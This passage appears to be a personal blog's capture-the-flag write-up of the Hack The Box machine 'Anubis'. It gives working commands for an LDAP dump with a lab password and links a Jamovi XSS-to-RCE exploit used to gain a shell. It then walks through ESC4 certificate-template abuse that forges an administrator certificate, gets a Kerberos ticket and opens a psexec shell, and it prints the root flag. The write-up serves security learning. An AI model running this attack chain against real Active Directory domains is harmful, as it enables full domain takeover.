+                                          WINDCORP.HTB\Administrator
+                                          WINDCORP.HTB\webdevelopers
+        Write Property Principals       : WINDCORP.HTB\Domain Admins
+                                          WINDCORP.HTB\Enterprise Admins
+                                          WINDCORP.HTB\Administrator
+                                          WINDCORP.HTB\webdevelopers
+&lt;snip&gt;</code></pre>
+</doc-codeblock></div>
+<p>There is a template for web where the webdevelopers have write propery over the certificate, meaning we can modify the cert to allow user authentication. As it already has EnrolleeSuppliesSubject we can specify any user.</p>
+<p>Going to dump ldap to see what users are in the webdevelopers group.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">proxychains ldapsearch -D localadmin@windcorp.htb -w 'Secret123' -H ldap://172.22.96.1 -s sub -b 'DC=windcorp,DC=htb' &gt; ldap.dmp
+cat ldap.dmp | grep -E dis.*web -B 5
+dn: CN=webdevelopers,OU=Development,DC=windcorp,DC=htb
+objectClass: top
+objectClass: group
+cn: webdevelopers
+member: CN=Diego Cruz,OU=MainOffice,DC=windcorp,DC=htb
+distinguishedName: CN=webdevelopers,OU=Development,DC=windcorp,DC=htb</code></pre>
+</doc-codeblock></div>
+<p>So we need to get to the Diego Cruz user.</p>
+<doc-anchor-target id="jamovi-xss-cve">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#jamovi-xss-cve">#</doc-anchor-trigger>
+        <span>Jamovi XSS CVE</span>
+    </h2>
+</doc-anchor-target>
+<p>Going back to smb and checking the shared folder, there is a file called <code v-pre>Whatif.omv</code> that seems to be being updated.</p>
+<p>Downloading and unzipping the file shows that the file is created by jamovi 1.6.16.0 which has a xss to rce CVE: <a href="https://github.com/g33xter/CVE-2021-28079">https://github.com/g33xter/CVE-2021-28079</a></p>
+<p>Running the exploit gives us a shell as <code v-pre>diegocruz</code>. :D</p>
+<doc-anchor-target id="esc4">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#esc4">#</doc-anchor-trigger>
+        <span>ESC4</span>
+    </h1>
+</doc-anchor-target>
+<p>As we are now a member of the webdevelopers group we can modify the template to allow for user auth. For this I&#x27;m going to use this script: <a href="https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1">https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1</a> which converts a template into the format needed to request a smartcard cert (pfx).</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">[&gt;] Get-SmartcardCertificate -Identity diegocruz -TemplateName Web</code></pre>
+</doc-codeblock></div>
+<p>We can check this worked by running certify on the box:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">.\certify.exe find /vulnerable /currentuser
+&lt;snip&gt;
+    CA Name                               : earth.windcorp.htb\windcorp-CA
+    Template Name                         : Web
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : NONE
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Server Authentication
+    mspki-certificate-application-policy  : Client Authentication
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
+                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
+        All Extended Rights         : WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
+&lt;snip&gt;</code></pre>
+</doc-codeblock></div>
+<p>Final step is to request the cert, get a tgt then psexec in:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">[&gt;] .\certify.exe request /ca:earth.windcorp.htb\windcorp-CA /template:Web /altname:administrator
+$ openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx
+$ proxychains python3 /opt/PKINITtools/gettgtpkinit.py -dc-ip 10.10.11.102 -cert-pfx cert.pfx windcorp.htb/administrator admin.ccache
+$ KRB5CCNAME=$(pwd)/admin.ccache proxychains -q psexec.py administrator@earth.windcorp.htb -k -no-pass -dc-ip 10.10.11.102</code></pre>
+</doc-codeblock></div>
+<p>root.txt:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">be33a363f06fa7cbd99a2e3bc0793151</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="things-to-learn--look-into">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#things-to-learn--look-into">#</doc-anchor-trigger>
+        <span>Things to learn / look into</span>
+    </h1>
+</doc-anchor-target>
+<p>How to request a cert for the current user on windows, this means I wouldnt have to drop certify on the box to request the cert.</p>
+<p>VBS revshell - instead of calling out to a ps1 file and executing it with <code v-pre>CreateObject(&quot;WScript.Shell&quot;).exec()</code>. This would also give me greater control over the process running my revshell.</p>
+<p>I&#x27;m probs going to do the box again soonish with the above stuff included as it would make it more fun and challenging.</p>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer class="clear-both">
+                            
+                                <nav class="flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../research/linux_kerb_tickets/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">Making Linux Kerberos Tickets Not Bad</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Anubis", level: 3, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
